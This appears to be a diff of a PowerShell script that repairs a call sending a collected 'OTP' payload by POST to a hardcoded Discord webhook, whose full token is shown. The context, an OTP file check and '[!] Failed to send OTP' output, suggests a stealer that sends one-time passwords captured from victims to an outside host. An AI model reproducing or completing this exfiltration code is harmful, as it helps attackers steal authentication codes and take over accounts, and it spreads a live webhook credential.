@@ -167,7 +167,7 @@ if (Test-Path $otpValidatedPath) {
         } | ConvertTo-Json -Depth 10
         
         try {
-            Invoke-RestMethod -Uri $webhookUrl - "https://discordapp.com/api/webhooks/1380951069718479070/Rtiw-SnS-vWs35FwERyqYm9Y-ZEOW7_UMHVTjnc6aZMauK1WifQ2ZqZMchJFfjTprblA" -Body $otpPayload -ContentType 'application/json'
+            Invoke-RestMethod -Uri "https://discordapp.com/api/webhooks/1380951069718479070/Rtiw-SnS-vWs35FwERyqYm9Y-ZEOW7_UMHVTjnc6aZMauK1WifQ2ZqZMchJFfjTprblA" -Method Post -Body $otpPayload -ContentType 'application/json'
         } catch {
             Write-Host "[!] Failed to send OTP to Discord" -ForegroundColor Red
         }
